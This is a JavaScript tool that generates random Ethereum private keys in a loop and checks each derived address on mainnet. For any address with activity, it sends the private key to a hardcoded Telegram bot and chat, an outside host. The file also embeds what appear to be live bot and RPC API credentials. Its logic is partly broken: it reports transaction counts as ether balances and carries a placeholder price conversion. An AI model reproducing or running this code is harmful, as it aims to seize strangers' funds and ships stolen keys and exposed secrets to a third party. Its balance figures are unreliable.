const { ethers } = require("ethers");
const Web3 = require("web3");
const crypto = require('crypto');
const TeleBot = require('telebot');

const TELEGRAM_BOT_TOKEN = '7681158402:AAHvvFfy6hzI_mrAd23L6G-eY4B1XWt3J0M';
const TELEGRAM_CHAT_ID = '8105279496';

const mainnet1 = 'wss://rpc.merkle.io/1/sk_mbs_86be78c4551ed30cf2d6898026ec62af';
const web31 = new Web3(new Web3.providers.WebsocketProvider(mainnet1));

let hit = 0;
let totalBalanceUSD = 0;
let count = 1;

const bot = new TeleBot({
    token: TELEGRAM_BOT_TOKEN
});

function logProgress(bitLength, address, privateKeyHex, totalBalanceUSD) {
    console.log(`                                    |
Raptor                              |
by Razor1911                        |
                                  .-'-.
                                 ' ___ '
                       ---------'  .-.  '---------
       _________________________'  '-'  '_________________________
        ''''''-|---|--/    \\==][^',_m_,'^][==/    \\--|---|-''''''
                      \\    /  ||/   H   \\||  \\    /
                       '--'   OO   O|O   OO   '--'`);
    console.log(`Bit Length: ${bitLength}`);
    console.log(`Address: ${address}`);
    console.log(`Private Key: ${privateKeyHex}`);
    console.log(`Total Balance in USD: $${totalBalanceUSD}`);
    console.log(`Total Hits: ${hit}`);
    console.log(`Checked Address Count: ${count}`);
    console.log(`--------------------Good Luck---------------------------`);
}

async function solve(bitLength, address, privateKeyHex) {
    let errorOccurred = false;

    while (!errorOccurred) {
        try {
            const transaction1 = await web31.eth.getTransactionCount(address);

            if (transaction1 > 0) {
                hit++;
                const balanceEth = parseFloat(ethers.utils.formatEther(transaction1));
                const formattedBalanceEth = balanceEth.toFixed(18);
                totalBalanceUSD += formattedBalanceEth * 1;  // Replace with actual ETH/USD conversion rate
                await bot.sendMessage(TELEGRAM_CHAT_ID, `Bit Length: ${bitLength}, Private Key: ${privateKeyHex}, Address: ${address}, ETH: ${formattedBalanceEth} ETH`);
            }
            logProgress(bitLength, address, privateKeyHex, totalBalanceUSD.toFixed(2));
            errorOccurred = true;
        } catch (error) {
            console.error("Error:", error.message);
            console.log(`Retrying with bit length: ${bitLength} in 5 seconds...`);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
    count++;
}

function generateRandomKey(bitLength) {
    const byteLength = Math.ceil(bitLength / 8);
    const randomBytes = crypto.randomBytes(byteLength);
    let privateKey = randomBytes.toString('hex');

    // Ensure the private key is padded to 256 bits (64 hex characters)
    const paddingLength = 64 - privateKey.length;
    privateKey = '0'.repeat(paddingLength) + privateKey;

    return privateKey;
}

// Function to generate and log private keys and addresses for a specific bit length
function generateAndLogKeyForBitLength(bitLength) {
    return new Promise(async (resolve) => {
        const privateKeyHex = generateRandomKey(bitLength);
        const wallet = new ethers.Wallet(privateKeyHex);
        const address = wallet.address;

        // Log the generated private key and corresponding address for the current bit length
        logProgress(bitLength, address, privateKeyHex, totalBalanceUSD.toFixed(2));

        // Check and solve for potential balance
        await solve(bitLength, address, privateKeyHex);
        resolve();
    });
}

// Function to generate and log keys for all bit lengths from 66 to 256 in parallel
async function searchAllBitRangesInParallel() {
    const tasks = [];

    for (let bitLength = 66; bitLength <= 256; bitLength++) {
        // Push each task to the tasks array
        tasks.push(generateAndLogKeyForBitLength(bitLength));
    }

    // Run all tasks in parallel
    await Promise.all(tasks);
}

// Main function to start the process
async function main() {
    count++;
    try {
        await searchAllBitRangesInParallel();
    } catch (e) {
        console.error(e);
        process.exit(1);
    }
}

bot.start();

(async () => {
    while (true) {
        try {
            await main();
        } catch (error) {
            console.error("Error:", error.message);
            console.log("Retrying in 5 seconds...");
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
})();
